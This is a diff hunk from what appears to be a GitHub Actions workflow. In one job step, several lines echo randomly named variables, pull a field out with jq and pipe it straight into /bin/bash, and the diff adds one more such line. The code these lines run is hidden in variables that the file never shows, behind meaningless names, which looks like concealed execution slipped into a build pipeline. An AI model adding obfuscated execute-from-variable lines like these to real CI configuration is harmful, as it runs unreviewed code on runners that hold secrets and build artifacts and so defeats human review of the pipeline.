@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$rmv15" | jq -r .ng35 | /bin/bash
           echo $qh50904 | jq -r .z701 | /bin/bash
           echo $mpiw07993 | jq -r .xt5 | /bin/bash
+          echo $cpdt725 | jq -r .z25 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
